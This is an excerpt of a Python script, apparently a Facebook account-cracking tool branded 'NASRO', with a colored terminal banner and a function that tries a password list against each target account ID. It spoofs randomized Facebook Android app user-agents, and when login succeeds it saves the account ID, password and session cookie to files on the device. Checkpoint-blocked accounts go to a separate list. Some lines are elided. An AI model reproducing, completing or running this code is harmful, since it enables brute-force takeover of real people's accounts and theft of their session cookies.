...
|__/  \__/|__/  |__/ \______/ |__/  |__/ \______/                                                                          
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [\033[1;91m✓\033[1;92m] AUTHOR    \033[1;91m: \033[1;92mNASRO      ┃
...
def ffb(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [NASRO-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99))+";FBBV/"+str(random.randint(11111111,77777777))+"; [FBAN/;FBAV/4Q095MQG;FBBV/297427042;FBAN/FBAN;FBAV/4Q095MQG;FBBV/297427042;FBDM//*{density=3.0,width=1440,height=1280};FBLC/ru_RU;FBRV/838095873;FBCR/LG;FBMF/VIVO;FBBD/Rivo;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5E;FBSV/13;FBOP/5;FBCA/armeabi;FBSS/;]"+"[FB4A/;FBAV/;FBBV/828039059;FBAN/FB4A;FBAV/;FBBV/828039059;FBDM//*{density=2.0,width=2560,height=4096};FBLC/zh_CN;FBRV/436733007;FBCR/LG;FBMF/Xiaomi;FBBD/Palm;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_Mix_14;FBSV/12;FBOP/4;FBCA/x86;FBSS/;]"
                        head = {'User-Agent': ua,
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/NASRO-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        open('/sdcard/NASRO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                ...
                                                open('/sdcard/NASRO-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
                                        continue
